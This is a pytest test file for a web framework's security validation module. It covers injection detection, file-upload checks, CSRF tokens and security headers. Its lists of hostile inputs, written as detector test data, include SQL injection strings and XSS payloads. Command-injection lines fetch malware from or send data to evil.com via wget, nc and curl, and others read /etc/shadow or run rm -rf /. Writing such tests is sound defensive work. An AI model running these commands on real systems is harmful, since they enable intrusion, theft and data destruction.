"""
Unit Tests for CovetPy Security Validation Module

These tests validate input validation, sanitization, and security validation
implementations. All tests use real validation logic to ensure production-grade
security against injection attacks and malicious input.

CRITICAL: Tests validate real security validation, not mocks.
"""

from dataclasses import dataclass
from typing import Any, Optional

import pytest
from covet.security.validation import (
    FileUploadValidator,
    InputValidator,
)

from covet.security.csrf import (
    CSRFProtection,
)
from covet.security.headers import (
    SecurityHeaders,
)


@dataclass
class ValidationTestCase:
    """Test case for validation testing."""

    input_value: Any
    expected_valid: bool
    expected_error: Optional[str] = None
    description: str = ""


@pytest.mark.unit
@pytest.mark.security
@pytest.mark.validation
class TestInputValidation:
    """Test input validation functionality."""

    @pytest.fixture
    def input_validator(self):
        """Create input validator."""
        return InputValidator(
            max_string_length=1000,
            max_array_length=100,
            max_object_depth=10,
            allow_html=False,
            sanitize_sql=True,
            normalize_unicode=True,
        )

    def test_string_length_validation(self, input_validator):
        """Test string length validation."""
        test_cases = [
            ValidationTestCase("short", True, description="Short string"),
            ValidationTestCase("a" * 500, True, description="Medium string"),
            ValidationTestCase("a" * 1000, True, description="Max length string"),
            ValidationTestCase("a" * 1001, False, "too long", "Overlong string"),
            ValidationTestCase("", True, description="Empty string"),
        ]

        for case in test_cases:
            result = input_validator.validate_string_length(case.input_value)

            assert result.is_valid == case.expected_valid, f"Failed: {case.description}"
            if case.expected_error:
                assert case.expected_error.lower() in result.error_message.lower()

    def test_sql_injection_detection(self, input_validator):
        """Test SQL injection detection and sanitization."""
        sql_injection_attempts = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "1; DELETE FROM users WHERE 1=1; --",
            "' UNION SELECT * FROM passwords --",
            "admin'--",
            "' OR 1=1#",
            "1'; INSERT INTO users VALUES ('hacker'); --",
            "1' AND (SELECT COUNT(*) FROM users) > 0 --",
        ]

        for injection_attempt in sql_injection_attempts:
            result = input_validator.detect_sql_injection(injection_attempt)

            assert result.is_malicious is True, f"Failed to detect: {injection_attempt}"
            assert len(result.detected_patterns) > 0

            # Test sanitization
            sanitized = input_validator.sanitize_sql_input(injection_attempt)
            assert sanitized.sanitized_value != injection_attempt
            assert "DROP TABLE" not in sanitized.sanitized_value.upper()
            assert "DELETE FROM" not in sanitized.sanitized_value.upper()

    def test_xss_detection_and_sanitization(self, input_validator):
        """Test XSS detection and sanitization."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "';alert('XSS');//",
            "<script src='http://evil.com/xss.js'></script>",
            "<div onclick='alert(\"XSS\")'>Click me</div>",
        ]

        for xss_payload in xss_payloads:
            result = input_validator.detect_xss(xss_payload)

            assert result.is_malicious is True, f"Failed to detect XSS: {xss_payload}"
            assert len(result.detected_patterns) > 0

            # Test sanitization
            sanitized = input_validator.sanitize_html(xss_payload)

            # Should not contain dangerous elements
            assert "<script>" not in sanitized.sanitized_value.lower()
            assert "javascript:" not in sanitized.sanitized_value.lower()
            assert "onerror=" not in sanitized.sanitized_value.lower()
            assert "onload=" not in sanitized.sanitized_value.lower()

    def test_command_injection_detection(self, input_validator):
        """Test command injection detection."""
        command_injection_attempts = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "; ping -c 1 evil.com",
            "$(cat /etc/shadow)",
            "`id`",
            "; wget http://evil.com/malware",
            "| nc evil.com 1337",
            "; curl -X POST http://evil.com/data",
            "&& chmod 777 /etc/passwd",
        ]

        for injection_attempt in command_injection_attempts:
            result = input_validator.detect_command_injection(injection_attempt)

            assert result.is_malicious is True, f"Failed to detect: {injection_attempt}"
            assert len(result.detected_patterns) > 0

    def test_path_traversal_detection(self, input_validator):
        """Test path traversal detection."""
        path_traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "/var/log/../../etc/shadow",
            "....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "file:///etc/passwd",
            "\\..\\..\\..\\windows\\system.ini",
        ]

        for traversal_attempt in path_traversal_attempts:
            result = input_validator.detect_path_traversal(traversal_attempt)

            assert result.is_malicious is True, f"Failed to detect: {traversal_attempt}"
            assert len(result.detected_patterns) > 0

    def test_unicode_normalization(self, input_validator):
        """Test Unicode normalization for security."""
        unicode_attacks = [
            "admin\\u200badmin",  # Zero-width space
            "admin\\u2028admin",  # Line separator
            "admin\\ufeffadmin",  # Byte order mark
            "admin\\u00a0admin",  # Non-breaking space
            "admin\\u202eadmin",  # Right-to-left override
            "test\\u0000null",  # Null character
            "script\\u2028alert",  # Line separator in script
        ]

        for attack_input in unicode_attacks:
            # Decode the unicode escapes
            decoded_input = attack_input.encode().decode("unicode_escape")

            result = input_validator.normalize_unicode(decoded_input)

            # Should normalize dangerous characters
            assert len(result.normalized_value) <= len(decoded_input)
            assert "\\u200b" not in result.normalized_value  # Zero-width space removed
            assert "\\u0000" not in result.normalized_value  # Null character removed

    def test_json_depth_validation(self, input_validator):
        """Test JSON depth validation."""
        # Valid depth
        valid_json = {"level1": {"level2": {"level3": "value"}}}
        result = input_validator.validate_json_depth(valid_json)
        assert result.is_valid is True

        # Create deeply nested JSON
        deep_json = {"level1": {}}
        current = deep_json["level1"]

        for i in range(2, 15):  # Create 14 levels deep
            current[f"level{i}"] = {}
            current = current[f"level{i}"]

        current["final"] = "value"

        result = input_validator.validate_json_depth(deep_json)
        assert result.is_valid is False
        assert "depth" in result.error_message.lower()

    def test_array_length_validation(self, input_validator):
        """Test array length validation."""
        # Valid array
        valid_array = list(range(50))
        result = input_validator.validate_array_length(valid_array)
        assert result.is_valid is True

        # Oversized array
        oversized_array = list(range(150))
        result = input_validator.validate_array_length(oversized_array)
        assert result.is_valid is False
        assert "length" in result.error_message.lower()

    def test_email_validation(self, input_validator):
        """Test email validation."""
        valid_emails = [
            "test@example.com",
            "user.name@domain.org",
            "user+tag@example.co.uk",
            "123@example.com",
            "test.email-with-dash@example.com",
        ]

        invalid_emails = [
            "invalid.email",
            "@example.com",
            "test@",
            "test..test@example.com",
            "test@example",
            "<script>alert('xss')</script>@example.com",
            "test@example.com; DROP TABLE users;",
            "very-long-email-address" * 10 + "@example.com",
        ]

        for email in valid_emails:
            result = input_validator.validate_email(email)
            assert result.is_valid is True, f"Valid email rejected: {email}"

        for email in invalid_emails:
            result = input_validator.validate_email(email)
            assert result.is_valid is False, f"Invalid email accepted: {email}"

    def test_url_validation(self, input_validator):
        """Test URL validation."""
        valid_urls = [
            "https://example.com",
            "http://subdomain.example.org/path",
            "https://example.com:8080/api/v1/resource?param=value",
            "ftp://files.example.com/download.txt",
            "https://example.com/path/with-dashes_and_underscores",
        ]

        malicious_urls = [
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            "file:///etc/passwd",
            "http://evil.com/redirect?url=http://example.com",
            "https://example.com@evil.com",  # Misleading URL
            "http://192.168.1.1",  # Internal IP
            "ftp://user:pass@example.com",  # Credentials in URL
        ]

        for url in valid_urls:
            result = input_validator.validate_url(url)
            assert result.is_valid is True, f"Valid URL rejected: {url}"

        for url in malicious_urls:
            result = input_validator.validate_url(url)
            # Most should be rejected as malicious
            if not result.is_valid:
                assert (
                    "malicious" in result.error_message.lower()
                    or "invalid" in result.error_message.lower()
                )


@pytest.mark.unit
@pytest.mark.security
@pytest.mark.validation
class TestFileUploadValidation:
    """Test file upload validation."""

    @pytest.fixture
    def file_validator(self):
        """Create file upload validator."""
        return FileUploadValidator(
            max_file_size=10 * 1024 * 1024,  # 10MB
            allowed_extensions=[
                ".jpg",
                ".jpeg",
                ".png",
                ".gif",
                ".pdf",
                ".txt",
                ".doc",
                ".docx",
            ],
            allowed_mime_types=[
                "image/jpeg",
                "image/png",
                "image/gif",
                "application/pdf",
                "text/plain",
                "application/msword",
                "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            ],
            scan_for_malware=True,
            check_file_signature=True,
        )

    def test_file_extension_validation(self, file_validator):
        """Test file extension validation."""
        valid_files = [
            {"filename": "document.pdf", "size": 1024},
            {"filename": "image.jpg", "size": 2048},
            {"filename": "photo.jpeg", "size": 1536},
            {"filename": "picture.png", "size": 2048},
            {"filename": "animation.gif", "size": 512},
            {"filename": "text.txt", "size": 256},
            {"filename": "report.doc", "size": 5120},
            {"filename": "presentation.docx", "size": 8192},
        ]

        malicious_files = [
            {"filename": "script.exe", "size": 1024},
            {"filename": "malware.bat", "size": 512},
            {"filename": "virus.scr", "size": 2048},
            {"filename": "trojan.com", "size": 1024},
            {"filename": "backdoor.pif", "size": 768},
            {"filename": "shell.php", "size": 1024},
            {"filename": "webshell.jsp", "size": 2048},
            {"filename": "exploit.asp", "size": 1536},
        ]

        for file_data in valid_files:
            result = file_validator.validate_file_extension(file_data["filename"])
            assert (
                result.is_valid is True
            ), f"Valid file rejected: {file_data['filename']}"

        for file_data in malicious_files:
            result = file_validator.validate_file_extension(file_data["filename"])
            assert (
                result.is_valid is False
            ), f"Malicious file accepted: {file_data['filename']}"

    def test_file_size_validation(self, file_validator):
        """Test file size validation."""
        # Valid sizes
        valid_sizes = [1024, 1024 * 1024, 5 * 1024 * 1024, 10 * 1024 * 1024]

        for size in valid_sizes:
            result = file_validator.validate_file_size(size)
            assert result.is_valid is True, f"Valid size rejected: {size}"

        # Invalid sizes
        invalid_sizes = [0, -1, 11 * 1024 * 1024, 100 * 1024 * 1024]

        for size in invalid_sizes:
            result = file_validator.validate_file_size(size)
            assert result.is_valid is False, f"Invalid size accepted: {size}"

    def test_mime_type_validation(self, file_validator):
        """Test MIME type validation."""
        valid_mime_types = [
            "image/jpeg",
            "image/png",
            "image/gif",
            "application/pdf",
            "text/plain",
            "application/msword",
        ]

        malicious_mime_types = [
            "application/x-executable",
            "application/x-msdownload",
            "application/x-dosexec",
            "text/html",  # Could contain XSS
            "application/javascript",
            "text/javascript",
            "application/x-php",
            "application/x-httpd-php",
        ]

        for mime_type in valid_mime_types:
            result = file_validator.validate_mime_type(mime_type)
            assert result.is_valid is True, f"Valid MIME type rejected: {mime_type}"

        for mime_type in malicious_mime_types:
            result = file_validator.validate_mime_type(mime_type)
            assert (
                result.is_valid is False
            ), f"Malicious MIME type accepted: {mime_type}"

    def test_filename_sanitization(self, file_validator):
        """Test filename sanitization."""
        malicious_filenames = [
            "../../../etc/passwd.txt",
            "..\\..\\windows\\system32\\config\\sam.txt",
            "file<script>alert('xss')</script>.txt",
            "file|with|pipes.txt",
            "file:with:colons.txt",
            'file"with"quotes.txt',
            "file*with*wildcards.txt",
            "file?with?questions.txt",
            "file\x00null.txt",
            "CON.txt",  # Windows reserved name
            "PRN.txt",  # Windows reserved name
            "AUX.txt",  # Windows reserved name
        ]

        for filename in malicious_filenames:
            result = file_validator.sanitize_filename(filename)

            # Should not contain dangerous characters
            assert "../" not in result.sanitized_value
            assert "..\\" not in result.sanitized_value
            assert "<script>" not in result.sanitized_value.lower()
            assert "|" not in result.sanitized_value
            assert ":" not in result.sanitized_value
            assert '"' not in result.sanitized_value
            assert "*" not in result.sanitized_value
            assert "?" not in result.sanitized_value
            assert "\x00" not in result.sanitized_value

    def test_file_signature_validation(self, file_validator):
        """Test file signature validation."""
        # Mock file signatures (magic numbers)
        file_signatures = {
            "image/jpeg": b"\xff\xd8\xff",
            "image/png": b"\x89\x50\x4e\x47\x0d\x0a\x1a\x0a",
            "application/pdf": b"%PDF-",
            "image/gif": b"GIF87a",
        }

        for mime_type, signature in file_signatures.items():
            # Create mock file content with correct signature
            file_content = signature + b"rest of file content..."

            result = file_validator.validate_file_signature(file_content, mime_type)
            assert result.is_valid is True, f"Valid signature rejected for {mime_type}"

        # Test mismatched signature
        pdf_content = b"%PDF-1.4 content..."
        result = file_validator.validate_file_signature(pdf_content, "image/jpeg")
        assert result.is_valid is False, "Mismatched signature accepted"


@pytest.mark.unit
@pytest.mark.security
@pytest.mark.validation
class TestCSRFProtection:
    """Test CSRF protection functionality."""

    @pytest.fixture
    def csrf_protection(self):
        """Create CSRF protection."""
        return CSRFProtection(
            secret_key="csrf_secret_key_for_testing_purposes_only",
            token_field_name="csrf_token",
            header_name="X-CSRF-Token",
            cookie_name="csrftoken",
            token_timeout_seconds=3600,
            exempt_paths=["/api/public/*", "/webhooks/*"],
        )

    def test_csrf_token_generation(self, csrf_protection):
        """Test CSRF token generation."""
        token = csrf_protection.generate_token()

        assert isinstance(token, str)
        assert len(token) >= 32  # Should be cryptographically secure

        # Generate multiple tokens - should be unique
        tokens = [csrf_protection.generate_token() for _ in range(10)]
        assert len(set(tokens)) == 10  # All unique

    def test_csrf_token_validation(self, csrf_protection):
        """Test CSRF token validation."""
        # Valid token
        token = csrf_protection.generate_token()
        assert csrf_protection.validate_token(token) is True

        # Invalid tokens
        invalid_tokens = [
            "invalid_token",
            "",
            None,
            "a" * 10,  # Too short
            "malicious_token_123",
            token + "tampered",  # Tampered token
        ]

        for invalid_token in invalid_tokens:
            assert csrf_protection.validate_token(invalid_token) is False

    def test_csrf_token_expiration(self, csrf_protection):
        """Test CSRF token expiration."""
        # Create CSRF protection with short timeout
        short_csrf = CSRFProtection(
            secret_key="test_secret", token_timeout_seconds=0.1  # Very short timeout
        )

        token = short_csrf.generate_token()
        assert short_csrf.validate_token(token) is True

        # Wait for expiration
        import time

        time.sleep(0.2)

        assert short_csrf.validate_token(token) is False

    def test_csrf_double_submit_cookie(self, csrf_protection):
        """Test double-submit cookie pattern."""
        # Generate token for both cookie and form/header
        token = csrf_protection.generate_token()

        # Same token in cookie and header should be valid
        assert csrf_protection.validate_double_submit(token, token) is True

        # Different tokens should be invalid
        other_token = csrf_protection.generate_token()
        assert csrf_protection.validate_double_submit(token, other_token) is False

        # Empty values should be invalid
        assert csrf_protection.validate_double_submit("", "") is False
        assert csrf_protection.validate_double_submit(token, "") is False
        assert csrf_protection.validate_double_submit("", token) is False

    def test_csrf_exempt_paths(self, csrf_protection):
        """Test CSRF exempt paths."""
        exempt_paths = [
            "/api/public/webhook",
            "/api/public/data",
            "/webhooks/github",
            "/webhooks/stripe",
        ]

        non_exempt_paths = [
            "/api/private/data",
            "/admin/users",
            "/profile/update",
            "/api/settings",
        ]

        for path in exempt_paths:
            assert (
                csrf_protection.is_exempt_path(path) is True
            ), f"Path should be exempt: {path}"

        for path in non_exempt_paths:
            assert (
                csrf_protection.is_exempt_path(path) is False
            ), f"Path should not be exempt: {path}"

    def test_csrf_middleware_integration(self, csrf_protection):
        """Test CSRF middleware integration."""
        # Mock request data
        safe_methods = ["GET", "HEAD", "OPTIONS", "TRACE"]
        unsafe_methods = ["POST", "PUT", "DELETE", "PATCH"]

        # Safe methods should not require CSRF token
        for method in safe_methods:
            requires_csrf = csrf_protection.requires_csrf_validation(
                method, "/api/data"
            )
            assert (
                requires_csrf is False
            ), f"Safe method should not require CSRF: {method}"

        # Unsafe methods should require CSRF token
        for method in unsafe_methods:
            requires_csrf = csrf_protection.requires_csrf_validation(
                method, "/api/data"
            )
            assert requires_csrf is True, f"Unsafe method should require CSRF: {method}"

        # Exempt paths should not require CSRF even for unsafe methods
        for method in unsafe_methods:
            requires_csrf = csrf_protection.requires_csrf_validation(
                method, "/api/public/webhook"
            )
            assert (
                requires_csrf is False
            ), f"Exempt path should not require CSRF: {method}"


@pytest.mark.unit
@pytest.mark.security
@pytest.mark.validation
class TestSecurityHeaders:
    """Test security headers functionality."""

    @pytest.fixture
    def security_headers(self):
        """Create security headers manager."""
        return SecurityHeaders(
            content_security_policy={
                "default-src": ["'self'"],
                "script-src": ["'self'", "'unsafe-inline'"],
                "style-src": ["'self'", "'unsafe-inline'"],
                "img-src": ["'self'", "data:", "https:"],
                "font-src": ["'self'", "https://fonts.gstatic.com"],
                "connect-src": ["'self'"],
                "frame-ancestors": ["'none'"],
                "base-uri": ["'self'"],
                "form-action": ["'self'"],
            },
            strict_transport_security={
                "max_age": 31536000,  # 1 year
                "include_subdomains": True,
                "preload": True,
            },
            x_frame_options="DENY",
            x_content_type_options="nosniff",
            x_xss_protection="1; mode=block",
            referrer_policy="strict-origin-when-cross-origin",
        )

    def test_content_security_policy_generation(self, security_headers):
        """Test Content Security Policy generation."""
        csp_header = security_headers.generate_csp_header()

        # Should contain required directives
        assert "default-src 'self'" in csp_header
        assert "script-src 'self' 'unsafe-inline'" in csp_header
        assert "frame-ancestors 'none'" in csp_header
        assert "base-uri 'self'" in csp_header

        # Should be properly formatted
        assert csp_header.endswith(";") or ";" in csp_header

    def test_strict_transport_security_generation(self, security_headers):
        """Test Strict Transport Security generation."""
        hsts_header = security_headers.generate_hsts_header()

        assert "max-age=31536000" in hsts_header
        assert "includeSubDomains" in hsts_header
        assert "preload" in hsts_header

    def test_security_headers_application(self, security_headers):
        """Test security headers application to response."""
        # Mock response headers
        response_headers = {}

        security_headers.apply_headers(response_headers)

        # Verify all security headers are applied
        assert "Content-Security-Policy" in response_headers
        assert "Strict-Transport-Security" in response_headers
        assert "X-Frame-Options" in response_headers
        assert "X-Content-Type-Options" in response_headers
        assert "X-XSS-Protection" in response_headers
        assert "Referrer-Policy" in response_headers

        # Verify header values
        assert response_headers["X-Frame-Options"] == "DENY"
        assert response_headers["X-Content-Type-Options"] == "nosniff"
        assert response_headers["X-XSS-Protection"] == "1; mode=block"
        assert response_headers["Referrer-Policy"] == "strict-origin-when-cross-origin"

    def test_csp_nonce_generation(self, security_headers):
        """Test CSP nonce generation."""
        nonce = security_headers.generate_nonce()

        assert isinstance(nonce, str)
        assert len(nonce) >= 16  # Should be cryptographically secure

        # Multiple nonces should be unique
        nonces = [security_headers.generate_nonce() for _ in range(10)]
        assert len(set(nonces)) == 10

    def test_csp_violation_reporting(self, security_headers):
        """Test CSP violation reporting setup."""
        report_uri = "https://example.com/csp-report"
        csp_with_reporting = security_headers.add_csp_reporting(report_uri)

        assert f"report-uri {report_uri}" in csp_with_reporting

        # Test report-to directive (newer standard)
        report_to_policy = security_headers.add_csp_report_to("csp-group")
        assert "report-to csp-group" in report_to_policy

    def test_security_headers_customization(self, security_headers):
        """Test security headers customization."""
        # Test custom CSP directive
        custom_csp = security_headers.customize_csp(
            {"worker-src": ["'self'"], "manifest-src": ["'self'"]}
        )

        assert "worker-src 'self'" in custom_csp
        assert "manifest-src 'self'" in custom_csp

        # Test feature policy (Permissions Policy)
        feature_policy = security_headers.generate_feature_policy(
            {
                "geolocation": ["'none'"],
                "camera": ["'self'"],
                "microphone": ["'none'"],
                "payment": ["'self'"],
            }
        )

        assert "geolocation=()" in feature_policy
        assert "camera=(self)" in feature_policy
        assert "microphone=()" in feature_policy
        assert "payment=(self)" in feature_policy


@pytest.mark.unit
@pytest.mark.security
@pytest.mark.validation
@pytest.mark.slow
class TestValidationPerformance:
    """Test validation performance characteristics."""

    def test_input_validation_performance(self):
        """Test input validation performance."""
        validator = InputValidator()

        # Test string validation performance
        test_strings = [f"test_string_{i}" * 10 for i in range(1000)]

        import time

        start_time = time.perf_counter()

        for test_string in test_strings:
            result = validator.validate_string_length(test_string)
            assert result.is_valid is True

        end_time = time.perf_counter()
        avg_time = (end_time - start_time) / len(test_strings)

        assert (
            avg_time < 0.001
        ), f"String validation too slow: {avg_time:.4f}s per string"

    def test_sql_injection_detection_performance(self):
        """Test SQL injection detection performance."""
        validator = InputValidator()

        # Test with various inputs including malicious ones
        test_inputs = [
            "normal_input",
            "another_normal_input_123",
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "normal input with spaces",
            "email@example.com",
            "SELECT * FROM table WHERE id = 1",
            "'; DELETE FROM users; --",
        ] * 125  # 1000 total inputs

        import time

        start_time = time.perf_counter()

        for test_input in test_inputs:
            validator.detect_sql_injection(test_input)
            # Don't assert on result as inputs are mixed

        end_time = time.perf_counter()
        avg_time = (end_time - start_time) / len(test_inputs)

        assert (
            avg_time < 0.01
        ), f"SQL injection detection too slow: {avg_time:.4f}s per input"

    def test_csrf_token_performance(self):
        """Test CSRF token generation and validation performance."""
        csrf = CSRFProtection(secret_key="performance_test_secret")

        import time

        # Test token generation performance
        start_time = time.perf_counter()

        tokens = []
        for _ in range(1000):
            token = csrf.generate_token()
            tokens.append(token)

        end_time = time.perf_counter()
        generation_time = (end_time - start_time) / 1000

        assert (
            generation_time < 0.001
        ), f"CSRF token generation too slow: {generation_time:.4f}s per token"

        # Test token validation performance
        start_time = time.perf_counter()

        for token in tokens:
            is_valid = csrf.validate_token(token)
            assert is_valid is True

        end_time = time.perf_counter()
        validation_time = (end_time - start_time) / 1000

        assert (
            validation_time < 0.002
        ), f"CSRF token validation too slow: {validation_time:.4f}s per token"
